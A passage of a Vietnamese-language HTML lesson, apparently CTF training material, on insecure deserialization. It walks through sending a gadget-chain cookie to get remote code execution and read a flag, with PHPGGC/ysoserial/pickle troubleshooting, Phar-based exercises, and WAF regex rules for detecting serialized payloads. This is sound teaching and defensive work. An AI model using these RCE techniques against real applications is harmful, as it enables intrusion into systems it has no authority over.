+    <div class="srow"><span class="n">4</span><div><div class="t">Gửi payload</div><div class="d">Thay cookie bằng payload vừa sinh (base64) → Response hiện output lệnh <code>id</code> ⟹ RCE xác nhận.</div></div></div>
+    <div class="srow"><span class="n">5</span><div><div class="t">Lấy flag</div><div class="d">Đổi lệnh thành <code>cat flag.txt</code>, gửi lại → Response hiện <code>FHACKER2026{...}</code>.</div></div></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / PHÒNG THỦ: VIẾT WAF RULE</div>
+  <h2>Chặn đúng payload, không chặn nhầm request thường</h2>
+  <table>
+    <tr><th>Rule (regex, cần decode base64 trước khi so khớp — tùy WAF có hỗ trợ không)</th><th>Khớp gì</th></tr>
+    <tr><td><code>^O:\d+:"</code> (sau decode base64)</td><td>PHP object serialize — hiếm khi là dữ liệu hợp lệ của session cookie thường</td></tr>
+    <tr><td><code>^\x80[\x02-\x05]</code> (byte đầu, sau decode base64)</td><td>Python pickle protocol marker</td></tr>
+    <tr><td><code>_\$\$ND_FUNC\$\$_</code></td><td>Chữ ký đặc trưng của node-serialize</td></tr>
+  </table>
+  <div class="note warn"><span class="tag">Giới hạn thực tế</span>Nếu WAF không hỗ trợ decode base64 trước khi
+  so khớp (nhiều WAF regex thuần không làm được), rule này không áp dụng được trực tiếp lên cookie đã encode.
+  Hỏi UI WAF của BTC có tính năng decode trước khi match không; nếu không, cân nhắc chặn theo độ dài bất thường
+  của cookie (payload gadget chain thường dài hơn nhiều so với session token thông thường).</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LỖI THƯỜNG GẶP & GỠ</div>
+  <h2>Khi gadget không ăn</h2>
+  <table>
+    <tr><th>Triệu chứng</th><th>Nguyên nhân</th><th>Cách sửa</th></tr>
+    <tr><td>Gadget PHPGGC chạy nhưng app báo lỗi 500 không rõ ràng</td><td>Sai phiên bản framework — gadget đó không khớp đúng bản Laravel/Symfony app đang chạy</td><td>Thử gadget khác trong cùng framework (<code>./phpggc -l laravel</code> liệt kê nhiều lựa chọn), hoặc xác định đúng version qua header/source trước</td></tr>
+    <tr><td>Python pickle: lỗi "AttributeError" khi unpickle</td><td>Class <code>Exploit</code> không tồn tại ở phía server lúc unpickle tìm lại (cần class CÙNG TÊN, không cần cùng nội dung, nhưng Python tìm theo module path)</td><td>Đặt class trong module <code>__main__</code> hoặc đúng tên module app có thể import được</td></tr>
+    <tr><td>ysoserial build lỗi (thiếu Maven/dependency)</td><td>Chưa cài Maven, hoặc không có Internet để tải dependency lúc build</td><td>Build TRƯỚC ngày thi khi còn Internet — không build được trong phòng thi</td></tr>
+    <tr><td>ysoserial build lỗi "Source/Target option 6 is no longer supported"</td><td><code>pom.xml</code> khoá cứng <code>source/target=1.6</code>, JDK 17+ không biên dịch được mức này</td><td>Sửa <code>pom.xml</code> lên <code>8</code> (mục 07.B)</td></tr>
+    <tr><td>ysoserial build xong nhưng chạy báo "package java.rmi.activation does not exist" hoặc <code>InaccessibleObjectException</code></td><td>JDK 17+ đã xoá <code>java.rmi.activation</code> VÀ chặn reflection module-private mặc định — cả build lẫn chạy đều cần JDK cũ hơn</td><td>Cài thêm JDK 11 riêng, build và chạy ysoserial bằng đúng <code>java</code>/<code>javac</code> của JDK 11 (mục 07.B), không dùng JDK mặc định của máy nếu đó là JDK 17+</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / NHẬN DIỆN & GIỚI HẠN</div>
+  <h2>Khi nào ĐƯỢC / KHÔNG dùng</h2>
+  <table>
+    <tr><th></th><th>Tình huống</th></tr>
+    <tr><td>✅</td><td>App deserialize dữ liệu từ input người dùng (cookie/token/field) bằng hàm nguy hiểm (<code>unserialize</code>, <code>pickle.loads</code>, <code>ObjectInputStream</code>), VÀ có gadget chain khả dụng cho đúng framework/phiên bản.</td></tr>
+    <tr><td>❌</td><td>App dùng định dạng dữ liệu an toàn hơn cho giao tiếp (JSON thuần, không object serialize) — không có magic method nào để lợi dụng.</td></tr>
+    <tr><td>❌</td><td>Framework/phiên bản không có gadget chain công khai nào phù hợp (có thể cần tự nghiên cứu gadget mới — vượt phạm vi 1 bài giảng, hiếm gặp ở Bảng C).</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 1 app Flask/PHP giả có <code>unserialize()</code>/<code>pickle.loads()</code>
+  trên cookie, tự viết class gadget Python <code>__reduce__()</code> để RCE.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Nhớ <code>__reduce__()</code> phải trả về tuple (hàm, tham số dạng
+  tuple), không phải gọi hàm trực tiếp trong <code>__reduce__()</code>.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> dùng PHPGGC sinh gadget cho framework khác (vd Symfony thay Laravel), xác
+  nhận cú pháp lệnh gọi tương tự.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>./phpggc -l symfony</code> xem danh sách, thử lần lượt vài
+  gadget đầu danh sách.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> app không deserialize trực tiếp từ cookie, nhưng có hàm
+  <code>file_exists($user_input)</code> gọi trên đường dẫn do người dùng kiểm soát. Giải thích cách Phar
+  deserialization (mục 06.A) biến lỗ hổng "chỉ kiểm tra file tồn tại" này thành RCE.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>PHP tự động "mở" file <code>phar://</code> để đọc metadata (kể cả khi
+  chỉ gọi hàm tưởng như vô hại như <code>file_exists</code>), và việc đọc metadata đó tự kích hoạt unserialize
+  nội dung file phar — cần upload được 1 file phar độc trước (kết hợp bài File Upload).</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>Magic method</td><td>Hàm đặc biệt được ngôn ngữ tự động gọi ở thời điểm nhất định (vd sau deserialize).</td></tr>
+    <tr><td>Gadget chain / POP chain</td><td>Chuỗi class có sẵn, khi dựng liên tiếp qua magic method dẫn tới hành động nguy hiểm.</td></tr>
+    <tr><td>Phar deserialization</td><td>Kỹ thuật kích hoạt unserialize PHP gián tiếp qua các hàm filesystem đọc file <code>phar://</code>.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ/tài liệu offline:</strong> <code>~/hoc/CTF/Tools/web/phpggc/</code>,
+  <code>~/hoc/CTF/Tools/web/ysoserial/</code> (cần build trước), <code>~/hoc/CTF/Tools/web/CyberChef/</code>.</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("deser-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("deser-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
